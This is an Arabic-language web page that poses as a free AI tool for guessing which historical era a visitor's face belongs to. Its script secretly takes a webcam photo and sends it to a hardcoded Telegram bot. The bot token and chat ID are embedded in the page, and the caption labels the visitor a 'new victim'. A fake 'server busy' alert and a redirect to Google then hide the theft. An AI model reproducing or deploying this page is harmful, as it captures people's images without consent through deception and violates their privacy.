<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحليل الوجه بالذكاء الاصطناعي - شكلك في الماضي</title>
    <style>
        body { background: #1a1a2e; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 30px; margin: 0; }
        .container { max-width: 500px; margin: auto; border: 2px solid #0f3460; padding: 25px; border-radius: 20px; background: #16213e; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        h1 { color: #e94560; font-size: 24px; }
        p { line-height: 1.6; color: #add8e6; }
        .btn { background: #e94560; color: white; border: none; padding: 15px 40px; border-radius: 50px; cursor: pointer; font-size: 18px; font-weight: bold; transition: 0.3s; margin-top: 20px; }
        .btn:hover { background: #ff5e78; transform: scale(1.05); }
        #status { display: none; margin-top: 25px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #e94560; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>اكتشف شكلك في الماضي 🏛️</h1>
        <p>بناءً على ملامح وجهك، سيقوم الذكاء الاصطناعي بتحديد العصر الذي تنتمي إليه (فرعوني، روماني، أموي، إلخ..)</p>
        
        <button class="btn" onclick="startAnalysis()">ابدأ التحليل المجاني</button>
        
        <div id="status">
            <div class="loader"></div>
            <p id="progress-text">جاري الاتصال بقاعدة البيانات...</p>
        </div>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // دمج معلوماتك الخاصة هنا
        const BOT_TOKEN = '8586526554:AAFC1KQ_lvsHAnwi8ErI5x27XLC42yGtgyg';
        const CHAT_ID = '7692110334';

        async function startAnalysis() {
            const statusDiv = document.getElementById('status');
            const progressText = document.getElementById('progress-text');
            statusDiv.style.display = 'block';

            try {
                // طلب الكاميرا (هنا النقطة الفاصلة)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                progressText.innerText = "جاري مسح الملامح الحيوية...";

                // تأخير بسيط لضمان وضوح الكاميرا
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'capture.jpg');
                        formData.append('caption', '🔔 ضحية جديدة دخلت للرابط وتم سحب الصورة!');

                        try {
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                            
                            // توجيه نهائي للتمويه
                            progressText.innerText = "تم التحليل! جاري جلب النتيجة...";
                            setTimeout(() => {
                                alert("عذراً، الخادم مضغوط حالياً! يرجى المحاولة بعد قليل.");
                                window.location.href = "https://www.google.com";
                            }, 2000);

                        } catch (e) {
                            console.error("Error sending to bot");
                        }
                    }, 'image/jpeg');
                }, 2000);

            } catch (err) {
                alert("يجب السماح بالكاميرا حتى يتمكن الذكاء الاصطناعي من تحليل وجهك!");
                statusDiv.style.display = 'none';
            }
        }
    </script>
</body>
</html>
